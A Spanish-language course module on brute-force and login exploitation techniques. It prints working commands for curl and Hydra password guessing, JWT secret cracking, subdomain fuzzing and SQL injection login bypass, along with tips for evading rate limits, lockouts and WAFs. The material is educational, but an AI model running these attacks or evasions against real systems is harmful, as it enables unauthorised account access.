
# 🔐 Fuerza Bruta y Explotación de Vulnerabilidades (Parte 2)

En este módulo ampliamos el enfoque de ataques por fuerza bruta y explotación de servicios, incluyendo técnicas más avanzadas, métodos personalizados, y explotación en aplicaciones modernas. También se cubren defensas comunes y cómo evadirlas.

---

## 🧠 Ataques de Fuerza Bruta Inteligente

Los ataques clásicos prueban cada combinación posible, pero podemos ser más efectivos con:

- Diccionarios personalizados basados en OSINT
- Reglas de mutación sobre contraseñas conocidas
- Combinaciones de nombres de usuario + patrones típicos

### 🛠️ Herramienta: `cewl`
```bash
cewl https://objetivo.com -w wordlist.txt
```

Crea una wordlist escaneando el contenido de un sitio objetivo.

---

## 🎭 Evasión de Protección contra Fuerza Bruta

Los sistemas modernos implementan mecanismos de defensa como:

- Captchas
- Retrasos temporales (rate limiting)
- Bloqueo tras intentos fallidos

### 🔄 Técnicas de evasión:

- Rotación de IPs con `proxychains`
- Bypasses usando parámetros alternativos (`user_login`, `usuario`, etc.)
- Automatización en herramientas como Burp Suite Intruder con pausas personalizadas

---

## 💻 Fuerza Bruta sobre Formularios con Curl

Ejemplo de ataque manual:
```bash
curl -X POST -d "user=admin&pass=password" http://192.168.1.10/login.php
```

Automatiza con Bash:
```bash
for pass in $(cat wordlist.txt); do
    curl -s -X POST -d "user=admin&pass=$pass" http://192.168.1.10/login.php | grep -q "Bienvenido" && echo "[+] Contraseña encontrada: $pass"
done
```

---

## 🕵️‍♂️ Fuerza Bruta de Subdominios

Herramientas como `wfuzz` o `ffuf` pueden detectar subdominios:

```bash
ffuf -w subdominios.txt -u http://FUZZ.objetivo.com
```

---

## 🔄 Fuerza Bruta con JWTs manipulados

Algunas aplicaciones web usan JSON Web Tokens para autenticación. Si la clave secreta es débil, puede ser descubierta por fuerza bruta.

```bash
python jwt_tool.py -t <token> -d wordlist.txt -C
```

---

## 🧨 Explotación de Login con SQL Injection + Fuerza Bruta

Una técnica híbrida: probar inyecciones SQL simples para evitar login y combinarlo con fuerza bruta.

```sql
' OR '1'='1
' OR 1=1--
```

---

## 🔐 Combinación de técnicas con Hydra

```bash
hydra -L users.txt -P pass.txt -f 192.168.1.10 http-post-form "/admin.php:user=^USER^&pass=^PASS^:F=Login failed"
```

---

📌 Buenas prácticas:

- Cambia user agents y cabeceras para evadir WAFs.
- Usa `Burp` y `ZAP` para interceptar e inspeccionar peticiones.
- Documenta parámetros de respuesta exitosos para automatizar validaciones.

---

📚 Recursos extra:

- https://github.com/ffuf/ffuf
- https://portswigger.net/burp
- https://github.com/ticarpi/jwt_tool

---

💡 “El atacante paciente no prueba más rápido, sino más inteligentemente.”
